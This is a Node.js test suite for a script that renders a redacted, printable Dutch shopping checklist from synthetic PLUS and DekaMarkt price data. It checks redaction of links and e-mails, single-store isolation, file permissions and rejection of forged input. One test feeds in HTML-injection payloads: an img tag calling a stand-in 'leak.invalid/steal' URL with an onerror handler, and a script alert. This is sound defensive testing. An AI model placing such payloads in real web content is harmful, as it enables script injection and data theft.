// Independent M3 QA on frozen product #2790 e18eb4c (15 Oct 2026).
// No retailer requests, observed prices, actual participants or production claims.
import test from 'node:test'
import assert from 'node:assert/strict'
import { mkdtemp, readFile, writeFile, stat, rm, access } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  renderPrintablePrivateShoppingChecklist,
  main,
} from '../scripts/retailer-private-shopping-checklist-html.mjs'

const shopItem = (store, cents) => ({
  status: 'matched',
  productId: 'fictional-' + store,
  productName: store + ' Fictieve pasta',
  packs: 2,
  packPriceCents: cents,
  totalCents: 2 * cents,
})

function fictionalReport() {
  return {
    format: 'supa-local-snapshot-comparison-v1',
    warning: 'Synthetic offline example, not a genuine retailer observation',
    captureSummary: [],
    comparison: {
      provenance: 'offline-snapshot-preview',
      claimable: false,
      comparable: true,
      cheaperStore: 'dekamarkt',
      savingsCents: 20,
      stores: {
        plus: { complete: true, subtotalCents: 240 },
        dekamarkt: { complete: true, subtotalCents: 220 },
      },
      lines: [{
        ingredientId: 'fictional-pasta', ingredient: 'Pasta',
        plus: shopItem('plus', 120),
        dekamarkt: shopItem('dekamarkt', 110),
      }],
    },
  }
}

async function temporaryReport(t, data) {
  const dir = await mkdtemp(join(tmpdir(), 'supa-qa-redaction-'))
  t.after(() => rm(dir, { recursive: true, force: true }))
  const source = join(dir, 'offline.json')
  await writeFile(source, JSON.stringify(data))
  return { dir, source }
}

test('independent: several mixed-case private identifiers disappear from print and checkbox labels', () => {
  const source = fictionalReport()
  source.comparison.lines[0].ingredient =
    'Pasta HTTPS://PRIVATE.INVALID/plan?token=secretAAA en www.my-private.invalid/cart?token=secretBBB'
  source.comparison.lines[0].plus.productName =
    'PLUS pasta First.Last+offer@EXAMPLE.INVALID en second@account.invalid'
  source.comparison.lines[0].dekamarkt.productName =
    'Deka pasta WWW.DEMO.INVALID/receipt?code=secretCCC'
  const unchanged = JSON.stringify(source)
  const html = renderPrintablePrivateShoppingChecklist(source)
  assert.match(html, /<input type="checkbox" aria-label="Afvinken:/)
  assert.match(html, /\[privélink verborgen\]/)
  assert.match(html, /\[privé e-mailadres verborgen\]/)
  assert.match(html, /PLUS pasta|Deka pasta/)
  assert.doesNotMatch(html, /secretAAA|secretBBB|secretCCC|first\.last\+offer|second@account|private\.invalid|my-private\.invalid|demo\.invalid/i)
  assert.doesNotMatch(html, /<a\b|href=|<script\b|<img\b/i)
  assert.match(html, /Geen live prijzen, geen winkeladvies, geen bewezen besparing/)
  assert.match(html, /ALLEEN OFFLINE TOTAAL PLUS: €2,40/)
  assert.match(html, /ALLEEN OFFLINE TOTAAL DekaMarkt: €2,20/)
  assert.equal(JSON.stringify(source), unchanged, 'renderer must leave source evidence unchanged')
})

test('independent: isolated retailer outputs remove opposing private labels and prices after redaction', () => {
  const source = fictionalReport()
  source.comparison.lines[0].plus.productName =
    'PLUS-ONLY-ID P1@PERSONAL.INVALID https://plus-only.invalid/checkout?key=uniqueP'
  source.comparison.lines[0].dekamarkt.productName =
    'DEKA-ONLY-ID D2@PERSONAL.INVALID www.deka-only.invalid/pay?key=uniqueD'
  const plus = renderPrintablePrivateShoppingChecklist(source, 'plus')
  const deka = renderPrintablePrivateShoppingChecklist(source, 'dekamarkt')
  for (const html of [plus, deka]) {
    assert.doesNotMatch(html, /uniqueP|uniqueD|personal\.invalid|plus-only\.invalid|deka-only\.invalid/i)
    assert.match(html, /\[privé e-mailadres verborgen\]/)
    assert.match(html, /\[privélink verborgen\]/)
    assert.match(html, /class="grid single-shop"/)
    assert.doesNotMatch(html, /name="storeView"/)
    assert.match(html, /geen bewezen besparing/i)
  }
  assert.match(plus, /PLUS-ONLY-ID|ALLEEN OFFLINE TOTAAL PLUS: €2,40/)
  assert.doesNotMatch(plus, /DEKA-ONLY-ID|DekaMarkt|€2,20/)
  assert.match(deka, /DEKA-ONLY-ID|ALLEEN OFFLINE TOTAAL DekaMarkt: €2,20/)
  assert.doesNotMatch(deka, /PLUS-ONLY-ID|PLUS|€2,40/)
})

test('independent: saved private JSON is byte-identical, both store exports are 0600 and scrub IDs', async t => {
  const data = fictionalReport()
  data.comparison.lines[0].ingredient = 'groenten contact@account.invalid'
  data.comparison.lines[0].plus.productName =
    'PRIVATE-PLUS https://private-plus.invalid/profile?auth=TOKEN987'
  data.comparison.lines[0].dekamarkt.productName =
    'PRIVATE-DEKA www.private-deka.invalid/orders?auth=TOKEN654'
  const { dir, source } = await temporaryReport(t, data)
  const before = await readFile(source)
  for (const store of ['plus', 'dekamarkt']) {
    const output = join(dir, store + '-private.html')
    const html = await main(['--report', source, '--output', output, '--store', store])
    assert.equal(await readFile(output, 'utf8'), html)
    assert.equal((await stat(output)).mode & 0o777, 0o600)
    assert.doesNotMatch(html, /TOKEN987|TOKEN654|contact@account|private-plus\.invalid|private-deka\.invalid/)
    assert.match(html, /\[privé e-mailadres verborgen\]|\[privélink verborgen\]/)
    assert.match(html, /Geen live prijzen/)
    if (store === 'plus') {
      assert.match(html, /PRIVATE-PLUS/)
      assert.doesNotMatch(html, /PRIVATE-DEKA|€2,20|DekaMarkt/)
    } else {
      assert.match(html, /PRIVATE-DEKA/)
      assert.doesNotMatch(html, /PRIVATE-PLUS|€2,40|PLUS/)
    }
  }
  assert.deepEqual(await readFile(source), before)
})

test('independent: HTML control strings cannot create markup or network resources', () => {
  const data = fictionalReport()
  data.comparison.lines[0].ingredient =
    '<img src="https://leak.invalid/steal?secret=ZZZ" onerror="alert(1)"> & pasta'
  data.comparison.lines[0].plus.productName =
    '<script>alert(2)</script> & "private" mail@domain.invalid'
  const html = renderPrintablePrivateShoppingChecklist(data, 'plus')
  assert.doesNotMatch(html, /<img\b|<script\b|<iframe\b|secret=ZZZ|mail@domain\.invalid/i)
  assert.match(html, /&lt;img|&lt;script/)
  assert.match(html, /&amp; pasta/)
  assert.match(html, /\[privélink verborgen\]/)
  assert.match(html, /\[privé e-mailadres verborgen\]/)
  assert.match(html, /Content-Security-Policy/)
  assert.match(html, /script-src &#39;none&#39;/)
})

test('independent: forged offline claim never creates a selected-store export', async t => {
  const data = fictionalReport()
  data.comparison.claimable = true
  data.comparison.lines[0].plus.productName = 'SENSITIVE-DO-NOT-PRINT'
  const { dir, source } = await temporaryReport(t, data)
  const output = join(dir, 'should-not-exist.html')
  await assert.rejects(
    () => main(['--report', source, '--output', output, '--store', 'plus']),
    /Invalid or claimable offline shopping checklist input/
  )
  await assert.rejects(access(output))
  assert.match(await readFile(source, 'utf8'), /SENSITIVE-DO-NOT-PRINT/)
})
